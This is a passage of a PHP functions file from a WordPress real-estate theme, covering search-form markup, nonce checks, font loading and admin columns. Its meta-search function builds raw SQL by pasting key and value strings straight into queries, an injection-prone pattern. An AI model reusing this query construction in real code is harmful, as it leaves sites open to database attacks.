                    '.$adv_categ_value.'               
                <span class="caret '.$caret_class.'"></span> </div>           
                <input type="hidden" name="filter_search_type[]" value="';
        if (isset($_GET['filter_search_type'][0])) {
            $return_string.= strtolower(esc_attr($_GET['filter_search_type'][0]));
        }
        $return_string.='">
                <ul  class="dropdown-menu filter_menu" role="menu" aria-labelledby="'.$appendix.'adv_categ">
                    '.$categ_select_list.'
                </ul>
            </div>    
        </div>';

        if (isset($_GET['advanced_city']) && $_GET['advanced_city']!='' && $_GET['advanced_city']!='all') {
            $full_name = get_term_by('slug', esc_html(wp_kses($_GET['advanced_city'], $allowed_html)), 'property_city');
            $advanced_city_value    = $advanced_city_value1 =   $full_name->name;
            $advanced_city_value1   = mb_strtolower(str_replace(' ', '-', $advanced_city_value1));
        } else {
            $advanced_city_value=__('All Cities', 'wpestate');
            $advanced_city_value1='all';
        }

        $return_string.='
        <div class="col-md-3">
            <div class="dropdown form-control '.$drop_class.'" >
                <div data-toggle="dropdown" id="'.$appendix.'advanced_city" class="'.$main_class.'" data-value="'. strtolower(rawurlencode($advanced_city_value1)).'"> 
                    '.$advanced_city_value.' 
                    <span class="caret '.$caret_class.'"></span> </div>           
                <input type="hidden" name="advanced_city" value="';
        if (isset($_GET['advanced_city'])) {
            $return_string.=strtolower(esc_attr($_GET['advanced_city']));
        }
        $return_string.='">
                <ul  class="dropdown-menu filter_menu" role="menu"  id="adv-search-city" aria-labelledby="'.$appendix.'advanced_city">
                    '.$select_city_list.'
                </ul>
            </div>    
        </div>';

            
        if (isset($_GET['advanced_area']) && $_GET['advanced_area']!=''&& $_GET['advanced_area']!='all') {
            $full_name = get_term_by('slug', esc_html(wp_kses($_GET['advanced_area'], $allowed_html)), 'property_area');
            $advanced_area_value=$advanced_area_value1= $full_name->name;
            $advanced_area_value1 = mb_strtolower(str_replace(' ', '-', $advanced_area_value1));
        } else {
            $advanced_area_value=__('All Areas', 'wpestate');
            $advanced_area_value1='all';
        }
        
            
        $return_string.='
        <div class="col-md-3">
            <div class="dropdown form-control '.$drop_class.'" >
                <div data-toggle="dropdown" id="'.$appendix.'advanced_area" class="'.$main_class.'" data-value="'.strtolower(rawurlencode($advanced_area_value1)).'">
                    '.$advanced_area_value.'
                    <span class="caret '.$caret_class.'"></span> </div>           
                    <input type="hidden" name="advanced_area" value="';
        if (isset($_GET['advanced_area'])) {
            $return_string.=strtolower(esc_attr($_GET['advanced_area']));
        }
        $return_string.='">
                <ul class="dropdown-menu filter_menu" role="menu" id="adv-search-area"  aria-labelledby="'.$appendix.'advanced_area">
                    '.$select_area_list.'
                </ul>
            </div>
        </div>';

        $return_string.='
        <div class="col-md-3">
        <input type="text" id="'.$appendix.'adv_rooms" class="form-control" name="advanced_rooms"  placeholder="'.__('Type Bedrooms No.', 'wpestate').'" 
               value="';
        if (isset($_GET['advanced_rooms'])) {
            $return_string.=   esc_attr($_GET['advanced_rooms']);
        }
        $return_string.='">
        </div>
        <div class="col-md-3">
        <input type="text" id="'.$appendix.'adv_bath"  class="form-control" name="advanced_bath"   placeholder="'.__('Type Bathrooms No.', 'wpestate').'"   
               value="';
        if (isset($_GET['advanced_bath'])) {
            $return_string.=  esc_attr($_GET['advanced_bath']);
        }
        $return_string.='"></div>';
        
        
        $show_slider_price      =   get_option('wp_estate_show_slider_price', '');
        $where_currency         =   esc_html(get_option('wp_estate_where_currency_symbol', ''));
        $currency               =   esc_html(get_option('wp_estate_currency_symbol', ''));
         
        
        if ($show_slider_price==='yes') {
            $min_price_slider= (floatval(get_option('wp_estate_show_slider_min_price', '')));
            $max_price_slider= (floatval(get_option('wp_estate_show_slider_max_price', '')));
                
            if (isset($_GET['price_low'])) {
                $min_price_slider=  floatval($_GET['price_low']) ;
            }
                
            if (isset($_GET['price_low'])) {
                $max_price_slider=  floatval($_GET['price_max']) ;
            }

            $price_slider_label = wpestate_show_price_label_slider($min_price_slider, $max_price_slider, $currency, $where_currency);
                             
            $return_string.='<div class="col-md-6">
                <div class="adv_search_slider">
                    <p>
                        <label for="'.$ammount.'">'.__('Price range:', 'wpestate').'</label>
                        <span id="'.$ammount.'"  style="border:0; color:#3C90BE; font-weight:bold;">'.$price_slider_label.'</span>
                    </p>
                    <div id="'.$slider.'"></div>';
            $custom_fields = get_option('wp_estate_multi_curr', true);
            if (!empty($custom_fields) && isset($_COOKIE['my_custom_curr']) &&  isset($_COOKIE['my_custom_curr_pos']) &&  isset($_COOKIE['my_custom_curr_symbol']) && $_COOKIE['my_custom_curr_pos']!=-1) {
                $i=intval($_COOKIE['my_custom_curr_pos']);

                if (!isset($_GET['price_low']) && !isset($_GET['price_max'])) {
                    $min_price_slider       =   $min_price_slider * $custom_fields[$i][2];
                    $max_price_slider       =   $max_price_slider * $custom_fields[$i][2];
                }
            }
            $return_string.='
                    <input type="hidden" id="'.$price_low.'"  name="price_low"  value="'.$min_price_slider.'>" />
                    <input type="hidden" id="'.$price_max.'"  name="price_max"  value="'.$max_price_slider.'>" />
                </div></div>';
        } else {
            $return_string.='
            <div class="col-md-3">
                <input type="text" id="'.$price_low.'" class="form-control advanced_select" name="price_low"  placeholder="'.__('Type Min. Price', 'wpestate').'" value=""/>
            </div>
            
            <div class="col-md-3">
                <input type="text" id="'.$price_max.'" class="form-control advanced_select" name="price_max"  placeholder="'.__('Type Max. Price', 'wpestate').'" value=""/>
            </div>';
        }


        return $return_string;
    }
endif;


add_filter('redirect_canonical', 'wpestate_disable_redirect_canonical', 10, 2);
function wpestate_disable_redirect_canonical($redirect_url, $requested_url)
{
    //print '$redirect_url'.$redirect_url;
    //print '$requested_url'.$requested_url;
    if (is_page_template('property_list.php') || is_page_template('property_list_half.php')) {
        $redirect_url = false;
    }
    
   
    return $redirect_url;
}

if (!function_exists('convertAccentsAndSpecialToNormal')):
function convertAccentsAndSpecialToNormal($string)
{
    $table = array(
        'À'=>'A', 'Á'=>'A', 'Â'=>'A', 'Ã'=>'A', 'Ä'=>'A', 'Å'=>'A', 'Ă'=>'A', 'Ā'=>'A', 'Ą'=>'A', 'Æ'=>'A', 'Ǽ'=>'A',
        'à'=>'a', 'á'=>'a', 'â'=>'a', 'ã'=>'a', 'ä'=>'a', 'å'=>'a', 'ă'=>'a', 'ā'=>'a', 'ą'=>'a', 'æ'=>'a', 'ǽ'=>'a',

        'Þ'=>'B', 'þ'=>'b', 'ß'=>'Ss',

        'Ç'=>'C', 'Č'=>'C', 'Ć'=>'C', 'Ĉ'=>'C', 'Ċ'=>'C',
        'ç'=>'c', 'č'=>'c', 'ć'=>'c', 'ĉ'=>'c', 'ċ'=>'c',

        'Đ'=>'Dj', 'Ď'=>'D', 'Đ'=>'D',
        'đ'=>'dj', 'ď'=>'d',

        'È'=>'E', 'É'=>'E', 'Ê'=>'E', 'Ë'=>'E', 'Ĕ'=>'E', 'Ē'=>'E', 'Ę'=>'E', 'Ė'=>'E',
        'è'=>'e', 'é'=>'e', 'ê'=>'e', 'ë'=>'e', 'ĕ'=>'e', 'ē'=>'e', 'ę'=>'e', 'ė'=>'e',

        'Ĝ'=>'G', 'Ğ'=>'G', 'Ġ'=>'G', 'Ģ'=>'G',
        'ĝ'=>'g', 'ğ'=>'g', 'ġ'=>'g', 'ģ'=>'g',

        'Ĥ'=>'H', 'Ħ'=>'H',
        'ĥ'=>'h', 'ħ'=>'h',

        'Ì'=>'I', 'Í'=>'I', 'Î'=>'I', 'Ï'=>'I', 'İ'=>'I', 'Ĩ'=>'I', 'Ī'=>'I', 'Ĭ'=>'I', 'Į'=>'I',
        'ì'=>'i', 'í'=>'i', 'î'=>'i', 'ï'=>'i', 'į'=>'i', 'ĩ'=>'i', 'ī'=>'i', 'ĭ'=>'i', 'ı'=>'i',

        'Ĵ'=>'J',
        'ĵ'=>'j',

        'Ķ'=>'K',
        'ķ'=>'k', 'ĸ'=>'k',

        'Ĺ'=>'L', 'Ļ'=>'L', 'Ľ'=>'L', 'Ŀ'=>'L', 'Ł'=>'L',
        'ĺ'=>'l', 'ļ'=>'l', 'ľ'=>'l', 'ŀ'=>'l', 'ł'=>'l',

        'Ñ'=>'N', 'Ń'=>'N', 'Ň'=>'N', 'Ņ'=>'N', 'Ŋ'=>'N',
        'ñ'=>'n', 'ń'=>'n', 'ň'=>'n', 'ņ'=>'n', 'ŋ'=>'n', 'ŉ'=>'n',

        'Ò'=>'O', 'Ó'=>'O', 'Ô'=>'O', 'Õ'=>'O', 'Ö'=>'O', 'Ø'=>'O', 'Ō'=>'O', 'Ŏ'=>'O', 'Ő'=>'O', 'Œ'=>'O',
        'ò'=>'o', 'ó'=>'o', 'ô'=>'o', 'õ'=>'o', 'ö'=>'o', 'ø'=>'o', 'ō'=>'o', 'ŏ'=>'o', 'ő'=>'o', 'œ'=>'o', 'ð'=>'o',

        'Ŕ'=>'R', 'Ř'=>'R',
        'ŕ'=>'r', 'ř'=>'r', 'ŗ'=>'r',

        'Š'=>'S', 'Ŝ'=>'S', 'Ś'=>'S', 'Ş'=>'S',
        'š'=>'s', 'ŝ'=>'s', 'ś'=>'s', 'ş'=>'s',

        'Ŧ'=>'T', 'Ţ'=>'T', 'Ť'=>'T',
        'ŧ'=>'t', 'ţ'=>'t', 'ť'=>'t',

        'Ù'=>'U', 'Ú'=>'U', 'Û'=>'U', 'Ü'=>'U', 'Ũ'=>'U', 'Ū'=>'U', 'Ŭ'=>'U', 'Ů'=>'U', 'Ű'=>'U', 'Ų'=>'U',
        'ù'=>'u', 'ú'=>'u', 'û'=>'u', 'ü'=>'u', 'ũ'=>'u', 'ū'=>'u', 'ŭ'=>'u', 'ů'=>'u', 'ű'=>'u', 'ų'=>'u',

        'Ŵ'=>'W', 'Ẁ'=>'W', 'Ẃ'=>'W', 'Ẅ'=>'W',
        'ŵ'=>'w', 'ẁ'=>'w', 'ẃ'=>'w', 'ẅ'=>'w',

        'Ý'=>'Y', 'Ÿ'=>'Y', 'Ŷ'=>'Y',
        'ý'=>'y', 'ÿ'=>'y', 'ŷ'=>'y',

        'Ž'=>'Z', 'Ź'=>'Z', 'Ż'=>'Z', 'Ž'=>'Z',
        'ž'=>'z', 'ź'=>'z', 'ż'=>'z', 'ž'=>'z',

        '“'=>'"', '”'=>'"', '‘'=>"'", '’'=>"'", '•'=>'-', '…'=>'...', '—'=>'-', '–'=>'-', '¿'=>'?', '¡'=>'!', '°'=>' degrees ',
        '¼'=>' 1/4 ', '½'=>' 1/2 ', '¾'=>' 3/4 ', '⅓'=>' 1/3 ', '⅔'=>' 2/3 ', '⅛'=>' 1/8 ', '⅜'=>' 3/8 ', '⅝'=>' 5/8 ', '⅞'=>' 7/8 ',
        '÷'=>' divided by ', '×'=>' times ', '±'=>' plus-minus ', '√'=>' square root ', '∞'=>' infinity ',
        '≈'=>' almost equal to ', '≠'=>' not equal to ', '≡'=>' identical to ', '≤'=>' less than or equal to ', '≥'=>' greater than or equal to ',
        '←'=>' left ', '→'=>' right ', '↑'=>' up ', '↓'=>' down ', '↔'=>' left and right ', '↕'=>' up and down ',
        '℅'=>' care of ', '℮' => ' estimated ',
        'Ω'=>' ohm ',
        '♀'=>' female ', '♂'=>' male ',
        '©'=>' Copyright ', '®'=>' Registered ', '™' =>' Trademark ',
    );

    $string = strtr($string, $table);
    // Currency symbols: £¤¥€  - we dont bother with them for now
    $string = preg_replace("/[^\x9\xA\xD\x20-\x7F]/u", "", $string);

    return $string;
}
endif;


function estate_create_onetime_nonce($action = -1)
{
    $time = time();
    // print $time.$action;
    $nonce = wp_create_nonce($time.$action);
    return $nonce . '-' . $time;
}
//1455041901register_ajax_nonce_topbar

function estate_verify_onetime_nonce($_nonce, $action = -1)
{
    $parts  =   explode('-', $_nonce);
    $nonce  =   $toadd_nonce    = $parts[0];
    $generated = $parts[1];

    $nonce_life = 60*60;
    $expires    = (int) $generated + $nonce_life;
    $time       = time();

    if (! wp_verify_nonce($nonce, $generated.$action) || $time > $expires) {
        return false;
    }
    
    $used_nonces = get_option('_sh_used_nonces');

    if (isset($used_nonces[$nonce])) {
        return false;
    }

    if (is_array($used_nonces)) {
        foreach ($used_nonces as $nonce=> $timestamp) {
            if ($timestamp > $time) {
                break;
            }
            unset($used_nonces[$nonce]);
        }
    }

    $used_nonces[$toadd_nonce] = $expires;
    asort($used_nonces);
    update_option('_sh_used_nonces', $used_nonces);
    return true;
}




function estate_verify_onetime_nonce_login($_nonce, $action = -1)
{
    $parts = explode('-', $_nonce);
    $nonce =$toadd_nonce= $parts[0];
    $generated = $parts[1];

    $nonce_life = 60*60;
    $expires    = (int) $generated + $nonce_life;
    $expires2   = (int) $generated + 120;
    $time       = time();

    if (! wp_verify_nonce($nonce, $generated.$action) || $time > $expires) {
        return false;
    }
    
    //Get used nonces
    $used_nonces = get_option('_sh_used_nonces');

    if (isset($used_nonces[$nonce])) {
        return false;
    }

    if (is_array($used_nonces)) {
        foreach ($used_nonces as $nonce=> $timestamp) {
            if ($timestamp > $time) {
                break;
            }
            unset($used_nonces[$nonce]);
        }
    }

    //Add nonce in the stack after 2min
    if ($time > $expires2) {
        $used_nonces[$toadd_nonce] = $expires;
        asort($used_nonces);
        update_option('_sh_used_nonces', $used_nonces);
    }
    return true;
}

function wpestate_file_upload_max_size()
{
    static $max_size = -1;

    if ($max_size < 0) {
        // Start with post_max_size.
        $max_size = wpestate_parse_size(ini_get('post_max_size'));

        // If upload_max_size is less, then reduce. Except if upload_max_size is
        // zero, which indicates no limit.
        $upload_max = wpestate_parse_size(ini_get('upload_max_filesize'));
        if ($upload_max > 0 && $upload_max < $max_size) {
            $max_size = $upload_max;
        }
    }
    return $max_size;
}

function wpestate_parse_size($size)
{
    $unit = preg_replace('/[^bkmgtpezy]/i', '', $size); // Remove the non-unit characters from the size.
  $size = preg_replace('/[^0-9\.]/', '', $size); // Remove the non-numeric characters from the size.
  if ($unit) {
      // Find the position of the unit in the ordered string which is the power of magnitude to multiply a kilobyte by.
      return round($size * pow(1024, stripos('bkmgtpezy', $unit[0])));
  } else {
      return round($size);
  }
}


add_action('wp_head', 'wpestate_rand654_add_css');
function wpestate_rand654_add_css()
{
    if (is_singular('estate_property')) {
        $local_id=get_the_ID();
        $wp_estate_global_page_template               =     intval(get_option('wp_estate_global_property_page_template'));
        $wp_estate_local_page_template                =     intval(get_post_meta($local_id, 'property_page_desing_local', true));
        if ($wp_estate_global_page_template!=0 || $wp_estate_local_page_template!=0) {
            if ($wp_estate_local_page_template!=0) {
                $id = $wp_estate_local_page_template;
            } else {
                $id = $wp_estate_global_page_template;
            }
         
            if ($id) {
                $shortcodes_custom_css = get_post_meta($id, '_wpb_shortcodes_custom_css', true);
                if (! empty($shortcodes_custom_css)) {
                    echo '<style type="text/css" data-type="vc_shortcodes-custom-css-'.$id.'">';
                    echo $shortcodes_custom_css;
                    echo '</style>';
                }
            }
        }
    }
}
// Enable font size & font family selects in the editor
if (! function_exists('wpex_mce_buttons')) {
    function wpex_mce_buttons($buttons)
    {
        array_unshift($buttons, 'fontselect'); // Add Font Select
        array_unshift($buttons, 'fontsizeselect'); // Add Font Size Select
        return $buttons;
    }
}
add_filter('mce_buttons_2', 'wpex_mce_buttons');






/*
add_filter('wp_handle_upload_prefilter', 'limit_wp_handle_upload_prefilter');
function limit_wp_handle_upload_prefilter($file) {
  // This bit is for the flash uploader
  if ($file['type']=='application/octet-stream' && isset($file['tmp_name'])) {
    $file_size = getimagesize($file['tmp_name']);
    if (isset($file_size['error']) && $file_size['error']!=0) {
      $file['error'] = "Unexpected Error: {$file_size['error']}";
      return $file;
    } else {
      $file['type'] = $file_size['mime'];
    }
  }
  if ($post_id = (isset($_REQUEST['post_id']) ? $_REQUEST['post_id'] : false)) {
    if (count(get_posts("post_type=attachment&post_parent={$post_id}"))>3)
      $file['error'] = "Sorry, you cannot upload more than four (4) image.";
  }
  return $file;
}
*/
/*

add_filter( 'script_loader_src', '_remove_script_version', 15, 1 );
add_filter( 'style_loader_src', '_remove_script_version', 15, 1 );

function _remove_script_version( $src ){
    print $src;
    $parts = explode( '?', $src );
    return $parts[0];
}

 */

if (!function_exists('wpestate_all_prop_details_prop_unit')):
function wpestate_all_prop_details_prop_unit()
{
    $single_details = array(
      
        'Image'         =>  'image',
        'Title'         =>  'title',
        'Description'   =>  'description',
        'Categories'    =>  'property_category',
        'Action'        =>  'property_action_category',
        'City'          =>  'property_city',
        'Neighborhood'  =>  'property_area',
        'County / State'=>  'property_county_state',
        'Address'       =>  'property_address',
        'Zip'           =>  'property_zip',
        'Country'       =>  'property_country',
        'Status'        =>  'property_status',
        'Price'         =>  'property_price',
     
        'Size'              =>  'property_size',
        'Lot Size'          =>  'property_lot_size',
        'Rooms'             =>  'property_rooms',
        'Bedrooms'          =>  'property_bedrooms',
        'Bathrooms'         =>  'property_bathrooms',
        'Agent'             =>  'property_agent',
        'Agent Picture'     =>  'property_agent_picture',

        'Brand Name' => 'brand_name',
        'Offering' => 'offering'
        
    );
    
    $custom_fields = get_option('wp_estate_custom_fields', true);
    if (!empty($custom_fields)) {
        $i=0;
        while ($i< count($custom_fields)) {
            $name =   $custom_fields[$i][0];
            $slug         =     wpestate_limit45(sanitize_title($name));
            $slug         =     sanitize_key($slug);
            $single_details[str_replace('-', ' ', $name)]=     $slug;
            $i++;
        }
    }
    
    $feature_list       =   esc_html(get_option('wp_estate_feature_list'));
    $feature_list_array =   explode(',', $feature_list);
    
    
    
    /*
    foreach($feature_list_array as $key => $value){
        $post_var_name=  str_replace(' ','_', trim($value) );
        $input_name =   wpestate_limit45(sanitize_title( $post_var_name ));
        $input_name =   sanitize_key($input_name);
        $single_details[$value]=      $input_name;
    }
    */
    return $single_details;
}
endif;




function wp_estate_customtypo_scripts()
{
    $protocol                   =   is_ssl() ? 'https' : 'http';
    $custom_fonts_array         =   array();
    $custom_fonts_array_subset  =   array();
    $items_to_load              =   array();
    
    
    $general_font_weight=':100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic,100,200,300,400,500,600,700,800,900';

    
    $h1_fontfamily  =   esc_html(get_option('wp_estate_h1_fontfamily', ''));
    $h1_fontsubset  =   esc_html(get_option('wp_estate_h1_fontsubset', ''));
    if ($h1_fontsubset!='') {
        $h1_fontsubset  =   '&amp;subset='.$h1_fontsubset;
    }
    
    if (!in_array($h1_fontfamily, $custom_fonts_array)  &&  $h1_fontfamily && $h1_fontfamily!='x') {
        $custom_fonts_array[]=$h1_fontfamily;
        $custom_fonts_array_subset[$h1_fontfamily]=$h1_fontsubset;
    }
    
    
      
    
    $h2_fontfamily  =   esc_html(get_option('wp_estate_h2_fontfamily', ''));
    $h2_fontsubset  =   esc_html(get_option('wp_estate_h2_fontsubset', ''));
    if ($h2_fontsubset!='') {
        $h2_fontsubset='&amp;subset='.$h2_fontsubset;
    }
    if (!in_array($h2_fontfamily, $custom_fonts_array)) {
        $custom_fonts_array[]=$h2_fontfamily;
        $custom_fonts_array_subset[$h2_fontfamily]=$h2_fontsubset;
    }
    
    
    $h3_fontfamily  =   esc_html(get_option('wp_estate_h3_fontfamily', ''));
    $h3_fontsubset  =   esc_html(get_option('wp_estate_h3_fontsubset', ''));
    if ($h3_fontsubset!='') {
        $h3_fontsubset='&amp;subset='.$h3_fontsubset;
    }
    if (!in_array($h3_fontfamily, $custom_fonts_array)) {
        $custom_fonts_array[]=$h3_fontfamily;
        $custom_fonts_array_subset[$h3_fontfamily]=$h3_fontsubset;
    }
    
    
    
    $h4_fontfamily  =   esc_html(get_option('wp_estate_h4_fontfamily', ''));
    $h4_fontsubset  =   esc_html(get_option('wp_estate_h4_fontsubset', ''));
    if ($h4_fontsubset!='') {
        $h4_fontsubset='&amp;subset='.$h4_fontsubset;
    }
    if (!in_array($h4_fontfamily, $custom_fonts_array)) {
        $custom_fonts_array[]=$h4_fontfamily;
        $custom_fonts_array_subset[$h4_fontfamily]=$h4_fontsubset;
    }
    
    
    
    
    $h5_fontfamily  =   esc_html(get_option('wp_estate_h5_fontfamily', ''));
    $h5_fontsubset  =   esc_html(get_option('wp_estate_h5_fontsubset', ''));
    if ($h5_fontsubset!='') {
        $h5_fontsubset='&amp;subset='.$h5_fontsubset;
    }
    if (!in_array($h5_fontfamily, $custom_fonts_array)) {
        $custom_fonts_array[]=$h5_fontfamily;
        $custom_fonts_array_subset[$h5_fontfamily]=$h5_fontsubset;
    }
    
    
    
    $h6_fontfamily  =   esc_html(get_option('wp_estate_h6_fontfamily', ''));
    $h6_fontsubset  =   esc_html(get_option('wp_estate_h6_fontsubset', ''));
    if ($h6_fontsubset!='') {
        $h6_fontsubset='&amp;subset='.$h6_fontsubset;
    }
    if (!in_array($h6_fontfamily, $custom_fonts_array)) {
        $custom_fonts_array[]=$h6_fontfamily;
        $custom_fonts_array_subset[$h6_fontfamily]=$h6_fontsubset;
    }
    
    
    
    $p_fontfamily   =   esc_html(get_option('wp_estate_p_fontfamily', ''));
    $p_fontsubset   =   esc_html(get_option('wp_estate_p_fontsubset', ''));
    if ($p_fontsubset!='') {
        $p_fontsubset='&amp;subset='.$p_fontsubset;
    }
    if (!in_array($p_fontfamily, $custom_fonts_array)) {
        $custom_fonts_array[]=$p_fontfamily;
        $custom_fonts_array_subset[$p_fontfamily]=$p_fontsubset;
    }
    
    
    
    
    $menu_fontfamily =  esc_html(get_option('wp_estate_menu_fontfamily', ''));
    $menu_fontsubset =  esc_html(get_option('wp_estate_menu_fontsubset', ''));
    if ($menu_fontsubset!='') {
        $menu_fontsubset='&amp;subset='.$menu_fontsubset;
    }
    if (!in_array($menu_fontfamily, $custom_fonts_array)) {
        $custom_fonts_array[]=$menu_fontfamily;
        $custom_fonts_array_subset[$menu_fontfamily]=$menu_fontsubset;
    }
    

    foreach ($custom_fonts_array as $key=>$value) {
        if ($value!='') {
            $font = str_replace(' ', '+', $value);
            wp_enqueue_style('wpestate-custom-font'.$key, "$protocol://fonts.googleapis.com/css?family=$font$general_font_weight$custom_fonts_array_subset[$font]");
        }
    }
}
add_action('wp_enqueue_scripts', 'wp_estate_customtypo_scripts');





function wpestate_search_delete_user($user_id)
{
    global $wpdb;

    $user_obj = get_userdata($user_id);
    $email = $user_obj->user_email;

    $args = array(
        'post_type'        => 'wpestate_search',
        'post_status'      =>  'any',
        'posts_per_page'   => -1 ,
        'meta_query' => array(
        array(
            'key'     => 'user_email',
            'value'   => $email,
            'compare' => '=',
        ),
    ),
    );
    $prop_selection = new WP_Query($args);
    
    while ($prop_selection->have_posts()): $prop_selection->the_post();
    $post_id=get_the_id();
    $user_email     =   get_post_meta($post_id, 'user_email', true) ;
    wp_delete_post($post_id, true);
    endwhile;
}
add_action('delete_user', 'wpestate_search_delete_user');


/*  ( mt1.meta_key = 'property_price' AND CAST(mt1.meta_value AS SIGNED) BETWEEN '0' AND '1500000' )
    AND
    ( mt2.meta_key = 'property_zip' AND CAST(mt2.meta_value AS SIGNED) = '999' )

greater
 *  ( mt2.meta_key = 'property_zip' AND CAST(mt2.meta_value AS SIGNED) >= '999'

 * like
 *  ( mt2.meta_key = 'property_zip' AND mt2.meta_value LIKE '%999%' )
 *
 * date bigger
 * ( mt2.meta_key = 'property_zip' AND CAST(mt2.meta_value AS DATE) >= '999' )
 *
 * date smaller
 *  *  */


if (!function_exists('wpestate_add_meta_post_to_search')):
function wpestate_add_meta_post_to_search($meta_array)
{
    global $table_prefix;
    
    
    foreach ($meta_array as $key=> $value) {
        switch ($value['compare']) {
            case '=':
                $potential_ids[$key]=wpestate_get_ids_by_query("
                    SELECT post_id
                    FROM ".$table_prefix."postmeta
                    WHERE meta_key = '".$value['key']."'
                    AND CAST(meta_value AS UNSIGNED) = '".$value['value']."'
                ");
                break;
            case '>=':
                if ($value['type']=='DATE') {
                    $potential_ids[$key]=wpestate_get_ids_by_query("
                        SELECT post_id
                        FROM ".$table_prefix."postmeta
                        WHERE meta_key = '".$value['key']."'
                        AND CAST(meta_value AS DATE) >= '".$value['value']."'
                    ");
                } else {
                    $potential_ids[$key]=wpestate_get_ids_by_query("
                        SELECT post_id
                        FROM ".$table_prefix."postmeta
                        WHERE meta_key = '".$value['key']."'
                        AND CAST(meta_value AS UNSIGNED) >= '".$value['value']."'
                    ");
                }
                break;
            case '<=':
                if ($value['type']=='DATE') {
                    $potential_ids[$key]=wpestate_get_ids_by_query("
                        SELECT post_id
                        FROM ".$table_prefix."postmeta
                        WHERE meta_key = '".$value['key']."'
                        AND CAST(meta_value AS DATE) <= '".$value['value']."'
                    ");
                } else {
                    $potential_ids[$key]=wpestate_get_ids_by_query("
                        SELECT post_id
                        FROM ".$table_prefix."postmeta
                        WHERE meta_key = '".$value['key']."'
                        AND CAST(meta_value AS UNSIGNED) <= '".$value['value']."'
                ");
                }
               
                break;
            case 'LIKE':
        
                $potential_ids[$key]=wpestate_get_ids_by_query("
                    SELECT post_id
                    FROM ".$table_prefix."postmeta
                    WHERE meta_key = '".$value['key']."' AND meta_value LIKE '%".$value['value']."%'
                ");
                break;
            case 'BETWEEN':
                 $potential_ids[$key]=wpestate_get_ids_by_query("
                    SELECT post_id
                    FROM ".$table_prefix."postmeta
                    WHERE meta_key = '".$value['key']."'
                    AND CAST(meta_value AS SIGNED)  BETWEEN '".$value['value'][0]."' AND '".$value['value'][1]."'
                ");
                //  ( mt1.meta_key = 'property_price' AND CAST(mt1.meta_value AS SIGNED) BETWEEN '95222' AND '764192' )
                break;
        }
        
        $potential_ids[$key]=  array_unique($potential_ids[$key]);
    }
    
   
    
    // print_r($potential_ids);
    $ids=[];
    if (!empty($potential_ids)) {
        foreach ($potential_ids[0] as $elements) {
            $ids[]=$elements;
        }
        //    print 'start with';
        //    print_r($ids);
        //    print '</br></br>';
        
        foreach ($potential_ids as $key=>$temp_ids) {
            $ids = array_intersect($ids, $temp_ids);
            //    print 'interserct '.$key;
        //    print_r($ids);
        //    print '</br></br>';
        }
    }
    
    $ids=  array_unique($ids);
    
    if (empty($ids)) {
        $ids[]=0;
    }
    //print '</br>returnes ';
    //print_r($ids);
    return $ids;
}
endif;


add_action('admin_enqueue_scripts', function () {
    if (is_admin()) {
        wp_enqueue_media();
    }
});




$remove_script_version= get_option('wp_estate_remove_script_version', '');
if ($remove_script_version=='yes') {
    if (! function_exists('wpstate_remove_version')) {
        function wpstate_remove_version($url)
        {
            if (strpos($url, 'ver=')) {
                $url = remove_query_arg('ver', $url);
            }
            return $url;
        }
    }
    add_filter('style_loader_src', 'wpstate_remove_version', 999);
    add_filter('script_loader_src', 'wpstate_remove_version', 999);
}




function noo_enable_vc_auto_theme_update()
{
    if (function_exists('vc_updater')) {
        $vc_updater = vc_updater();
        remove_filter('upgrader_pre_download', array( $vc_updater, 'preUpgradeFilter' ), 10);
        if (function_exists('vc_license')) {
            if (!vc_license()->isActivated()) {
                remove_filter('pre_set_site_transient_update_plugins', array( $vc_updater->updateManager(), 'check_update' ), 10);
            }
        }
    }
}
add_action('vc_after_init', 'noo_enable_vc_auto_theme_update');


add_filter('manage_posts_columns', 'wpestate_add_id_column', 5);
add_action('manage_posts_custom_column', 'wpestate_id_column_content', 5, 2);
add_filter('manage_pages_columns', 'wpestate_add_id_column', 5);
add_action('manage_pages_custom_column', 'wpestate_id_column_content', 5, 2);
add_filter('manage_media_columns', 'wpestate_add_id_column', 5);
add_action('manage_media_custom_column', 'wpestate_id_column_content', 5, 2);


add_action('manage_edit-category_columns', 'wpestate_add_id_column', 5);
add_filter('manage_category_custom_column', 'wpestate_categoriesColumnsRow', 10, 3);
add_action('manage_edit-property_category_agent_columns', 'wpestate_add_id_column', 5);
add_filter('manage_property_category_agent_custom_column', 'wpestate_categoriesColumnsRow', 10, 3);

add_action('manage_edit-property_action_category_agent_columns', 'wpestate_add_id_column', 5);
add_filter('manage_property_action_category_agent_custom_column', 'wpestate_categoriesColumnsRow', 10, 3);

add_action('manage_edit-property_city_agent_columns', 'wpestate_add_id_column', 5);
add_filter('manage_property_city_agent_custom_column', 'wpestate_categoriesColumnsRow', 10, 3);

add_action('manage_edit-property_area_agent_columns', 'wpestate_add_id_column', 5);
add_filter('manage_property_area_agent_custom_column', 'wpestate_categoriesColumnsRow', 10, 3);

add_action('manage_edit-property_county_state_agent_columns', 'wpestate_add_id_column', 5);
add_filter('manage_property_county_state_agent_custom_column', 'wpestate_categoriesColumnsRow', 10, 3);

add_action('manage_edit-property_category_columns', 'wpestate_add_id_column', 5);
add_filter('manage_property_category_custom_column', 'wpestate_categoriesColumnsRow', 10, 3);

add_action('manage_edit-property_action_category_columns', 'wpestate_add_id_column', 5);
add_filter('manage_property_action_category_custom_column', 'wpestate_categoriesColumnsRow', 10, 3);

add_action('manage_edit-property_city_columns', 'wpestate_add_id_column', 5);
add_filter('manage_property_city_custom_column', 'wpestate_categoriesColumnsRow', 10, 3);


add_action('manage_edit-property_county_state_columns', 'wpestate_add_id_column', 5);
add_filter('manage_property_county_state_custom_column', 'wpestate_categoriesColumnsRow', 10, 3);

function wpestate_add_id_column($columns)
{
    $columns['revealid_id'] = 'ID';
    return $columns;
}

function wpestate_id_column_content($column, $id)
{
    if ('revealid_id' == $column) {
        echo $id;
    }
}


function wpestate_categoriesColumnsRow($argument, $columnName, $categoryID)
{
    if ($columnName == 'revealid_id') {
        return $categoryID;
    }
}

add_filter('media_send_to_editor', 'wpestate_media_editor', 1, 3);
function wpestate_media_editor($html, $send_id, $attachment)
{
    //get the media's guid and append it to the html
    $post = get_post($send_id);
    $html .= '<media>'.$post->guid.'</media>';
    return $html;
}

if (!function_exists('custom_register_roles')) {
    function custom_register_roles($key = null)
    {
        $roles = array(
            'buyer' => 'Buyer',
            's_biz_for_sale' => 'Seller - Biz for Sale',
            's_franchise' => 'Seller - Franchise'
        );

        if ($key) {
            if (isset($roles[$key])) {
                return $roles[$key];
            } else {
